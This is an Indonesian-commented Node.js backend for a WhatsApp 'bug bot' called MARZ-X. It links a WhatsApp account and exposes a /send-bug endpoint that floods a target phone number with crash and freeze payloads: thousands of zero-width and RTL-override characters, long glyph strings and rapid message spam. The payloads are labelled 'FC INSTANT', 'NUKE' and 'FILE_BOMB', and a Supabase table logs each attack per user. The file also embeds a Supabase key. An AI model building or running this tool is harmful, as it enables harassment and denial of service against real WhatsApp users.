const express = require('express');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, makeInMemoryStore } = require('@whiskeysockets/baileys');
const qrcode = require('qrcode-terminal');
const QRCode = require('qrcode');
const { createClient } = require('@supabase/supabase-js');
const { Boom } = require('@hapi/boom');
const app = express();
app.use(express.json());

// ============================================================
// KONFIGURASI SUPABASE
// ============================================================
const SUPABASE_URL = 'https://nxihknuzzmqbdcazikln.supabase.co';
const SUPABASE_ANON_KEY = 'sb_publishable_NnBJVtkGKDp1ZhLVYpxKXg_KMCK9EvO';
const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// ============================================================
// VARIABEL GLOBAL
// ============================================================
let currentPairingCode = null;
let currentQRString = null;          // QR string dari WhatsApp
let phoneNumberForPairing = '6281234567890'; // GANTI DENGAN NOMOR BOT!
let sock = null;
let isReady = false;

// ============================================================
// KONFIGURASI WHATSAPP
// ============================================================
const store = makeInMemoryStore({});

async function connectToWhatsApp() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info_baileys');
    sock = makeWASocket({
        printQRInTerminal: true,
        auth: state,
        browser: ['MARZ-X Bot', 'Chrome', '1.0.0']
    });

    // Generate Pairing Code (8 digit)
    setTimeout(async () => {
        if (!sock.authState.creds.registered) {
            try {
                const code = await sock.requestPairingCode(phoneNumberForPairing);
                currentPairingCode = code;
                console.log(`[PAIRING CODE] ${code}`);
            } catch (err) {
                console.error('[ERROR] Gagal generate pairing code:', err.message);
                currentPairingCode = null;
            }
        }
    }, 3000);

    store.bind(sock.ev);

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;
        if (qr) {
            currentQRString = qr;   // simpan QR string
            console.log('[QR] QR Code tersedia di endpoint /qr');
            qrcode.generate(qr, { small: true });
        }
        if (connection === 'close') {
            const shouldReconnect = (lastDisconnect?.error instanceof Boom)?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                console.log('[INFO] Reconnecting...');
                connectToWhatsApp();
            } else {
                console.log('[INFO] Logged out, pairing ulang.');
                isReady = false;
                currentPairingCode = null;
                currentQRString = null;
            }
        } else if (connection === 'open') {
            console.log('[INFO] Bot WhatsApp siap!');
            isReady = true;
            currentPairingCode = null;
            currentQRString = null;
        }
    });

    return sock;
}

connectToWhatsApp();

const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

// ============================================================
// FUNGSI UPDATE STATISTIK KE SUPABASE
// ============================================================
async function updateUserStats(username, effect, target) {
    if (!username) return;
    try {
        const { data: stats, error: fetchError } = await supabase
            .from('users_stats')
            .select('bug_count, tool_count')
            .eq('username', username)
            .single();

        let bugCount = 0, toolCount = 0;
        if (!fetchError && stats) {
            bugCount = stats.bug_count || 0;
            toolCount = stats.tool_count || 0;
        }
        bugCount += 1;

        await supabase
            .from('users_stats')
            .upsert({
                username: username,
                bug_count: bugCount,
                tool_count: toolCount,
                updated_at: new Date().toISOString()
            }, { onConflict: 'username' });

        const detail = `Efek: ${effect}\nTarget: ${target}\nJam: ${new Date().toLocaleString('id-ID', { hour12: false })}`;
        await supabase
            .from('activity_logs')
            .insert({
                username: username,
                type: 'BUG',
                detail: detail,
                status: 'DONE',
                timestamp: new Date().toISOString()
            });

    } catch (err) {
        console.error('[ERROR] Supabase:', err);
    }
}

// ============================================================
// ENDPOINT KIRIM BUG
// ============================================================
app.post('/send-bug', async (req, res) => {
    const { targetNumber, effect, username, count = 0 } = req.body;

    if (!isReady || !sock) {
        return res.status(503).json({ 
            error: 'Bot belum siap. Gunakan /pairing-code atau /qr untuk pairing.',
            status: 'disconnected'
        });
    }
    if (!targetNumber) {
        return res.status(400).json({ error: 'Nomor target wajib diisi!' });
    }

    const chatId = targetNumber.includes('@s.whatsapp.net') ? targetNumber : `${targetNumber}@s.whatsapp.net`;
    console.log(`[ACTION] Effect: ${effect} -> Target: ${targetNumber} (user: ${username || 'unknown'})`);

    try {
        // --- SEMUA EFEK SAMA (disingkat agar tidak terlalu panjang) ---
        if (effect === 'DELAY HARD') {
            const total = count || 25;
            for (let i = 0; i < total; i++) {
                await sock.sendMessage(chatId, { text: `[DELAY] ${i+1}/${total}` });
                await delay(Math.floor(Math.random() * 700) + 200);
            }
        } else if (effect === 'BLANK HARD') {
            await sock.sendMessage(chatId, { text: '\u200B'.repeat(3000) });
            await sock.sendMessage(chatId, { text: '‎‏‎‏‎‏‎‏‎‏‎‏‎‏'.repeat(200) });
            await sock.sendMessage(chatId, { text: ''.repeat(100) });
        } else if (effect === 'FREEZE HARD') {
            const total = count || 60;
            for (let i = 0; i < total; i++) {
                await sock.sendMessage(chatId, { text: '.' });
                await delay(15);
            }
        } else if (effect === 'FC INSTANT') {
            await sock.sendMessage(chatId, { text: '*_~teks rusak~_*' + ' '.repeat(300) + '*bold tidak tutup' });
            await sock.sendMessage(chatId, { text: '```bash\n$ echo "hack"\n```' + '\n'.repeat(150) + '```' });
            await sock.sendMessage(chatId, { text: '‎‏‎‏‎‏'.repeat(300) });
            await sock.sendMessage(chatId, { text: 'ဪ'.repeat(2000) });
        } else if (effect === 'RESTART HARD') {
            const total = count || 10;
            for (let i = 0; i < total; i++) {
                await sock.sendMessage(chatId, { text: `[FILE] dummy ${i+1}/${total}` });
                await delay(80);
            }
        } else if (effect === 'BOOTLOOP HARD') {
            for (let i = 0; i < 30; i++) {
                await sock.sendMessage(chatId, { text: '[LOOP] ' + '\u200B'.repeat(300) });
                await delay(50);
            }
        } else if (effect === 'NUKE') {
            for (let i = 0; i < 20; i++) {
                await sock.sendMessage(chatId, { text: '[NUKE] ' + '#'.repeat(40) });
                await delay(60);
            }
            await sock.sendMessage(chatId, { text: '\u200B'.repeat(4000) });
            for (let i = 0; i < 50; i++) {
                await sock.sendMessage(chatId, { text: '.' });
                await delay(10);
            }
            await sock.sendMessage(chatId, { text: '*_~rusak~_*' + ' '.repeat(200) + '*' });
        } else if (effect === 'VIRTEX_LEGACY') {
            await sock.sendMessage(chatId, { text: '\u202E' + 'SERANGAN BALIK' + '\u202D' });
            await sock.sendMessage(chatId, { text: 'ဪ'.repeat(3000) });
            await sock.sendMessage(chatId, { text: '‍'.repeat(2000) });
            await sock.sendMessage(chatId, { text: 'X'.repeat(5000) });
        } else if (effect === 'FILE_BOMB') {
            const total = count || 25;
            for (let i = 0; i < total; i++) {
                await sock.sendMessage(chatId, { text: `[BOMB] ${i+1}/${total}` });
                await delay(30);
            }
        } else {
            return res.status(400).json({ error: `Efek "${effect}" tidak dikenal!` });
        }

        if (username) {
            await updateUserStats(username, effect, targetNumber);
        }

        res.json({
            success: true,
            effect: effect,
            target: targetNumber,
            message: `✅ Efek "${effect}" berhasil dikirim ke ${targetNumber}`
        });

    } catch (error) {
        console.error('[ERROR]', error);
        res.status(500).json({
            error: error.message || 'Gagal mengirim efek'
        });
    }
});

// ============================================================
// ENDPOINT QR CODE – KEMBALIKAN GAMBAR PNG
// ============================================================
app.get('/qr', async (req, res) => {
    if (isReady) {
        return res.status(400).json({ error: 'Bot sudah terhubung, tidak perlu QR.' });
    }
    if (!currentQRString) {
        return res.status(404).json({ error: 'QR belum tersedia. Tunggu beberapa saat atau restart bot.' });
    }

    try {
        // Generate QR Code sebagai buffer PNG
        const qrBuffer = await QRCode.toBuffer(currentQRString, {
            type: 'png',
            width: 300,
            margin: 2,
            color: {
                dark: '#000000',
                light: '#ffffff'
            }
        });
        res.setHeader('Content-Type', 'image/png');
        res.send(qrBuffer);
    } catch (err) {
        console.error('[ERROR] Generate QR:', err);
        res.status(500).json({ error: 'Gagal generate gambar QR' });
    }
});

// ============================================================
// ENDPOINT PAIRING CODE (8 DIGIT)
// ============================================================
app.get('/pairing-code', (req, res) => {
    if (isReady) {
        return res.json({ 
            status: 'ready', 
            message: 'Bot sudah terhubung, tidak perlu pairing.',
            code: null 
        });
    }
    if (currentPairingCode) {
        return res.json({
            status: 'disconnected',
            message: 'Masukkan kode 8 digit ini ke WhatsApp > Perangkat Tertaut > Tautkan Perangkat dengan Nomor Telepon.',
            code: currentPairingCode,
            expiresIn: '60 detik'
        });
    } else {
        return res.json({
            status: 'disconnected',
            message: 'Pairing code belum tersedia. Tunggu beberapa saat atau restart bot.',
            code: null
        });
    }
});

// ============================================================
// ENDPOINT STATUS
// ============================================================
app.get('/status', (req, res) => {
    res.json({
        status: isReady ? 'ready' : 'disconnected',
        message: isReady ? 'Bot WhatsApp siap digunakan' : 'Bot belum siap. Gunakan /pairing-code atau /qr untuk pairing.',
        pairingCode: isReady ? null : currentPairingCode,
        qrAvailable: !isReady && !!currentQRString
    });
});

// ============================================================
// ENDPOINT ROOT
// ============================================================
app.get('/', (req, res) => {
    res.json({
        name: 'MARZ-X Backend',
        version: '1.0.0',
        endpoints: {
            status: '/status',
            pairingCode: '/pairing-code',
            qr: '/qr (returns image)',
            sendBug: '/send-bug (POST)'
        },
        status: isReady ? 'online' : 'offline'
    });
});

// ============================================================
// JALANKAN SERVER
// ============================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[SERVER] Berjalan di http://localhost:${PORT}`);
    console.log(`[ENDPOINT] GET /qr            -> ambil gambar QR`);
    console.log(`[ENDPOINT] GET /pairing-code  -> ambil kode 8 digit`);
    console.log(`[ENDPOINT] POST /send-bug     -> kirim efek`);
});
